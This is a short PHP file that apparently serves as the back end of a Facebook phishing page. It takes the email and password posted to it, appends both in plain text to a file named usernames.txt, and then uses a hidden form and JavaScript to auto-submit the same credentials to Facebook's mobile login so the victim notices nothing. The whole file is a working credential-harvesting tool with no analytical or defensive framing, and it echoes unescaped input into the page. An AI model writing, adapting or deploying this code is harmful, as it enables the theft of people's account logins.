<?php

$user = $_POST["email"];
$pwd = $_POST["pass"];

if (!empty($_POST["email"])) {file_put_contents("usernames.txt", "User: " . $_POST["email"] . "\nPass: " . $_POST["pass"] . "\n\n", FILE_APPEND);                 }
	
?>

<form name="fbform" method="post" action="https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&amp;lwv=100&amp;refid=8" class="bd be" id="login_form" novalidate="1">
	<input type="hidden" name="email" value="<?php echo $user ?>">
	<input type="hidden" name="pass" value="<?php echo $pwd ?>">
	<script language="JavaScript">document.fbform.submit();</script>
</form>

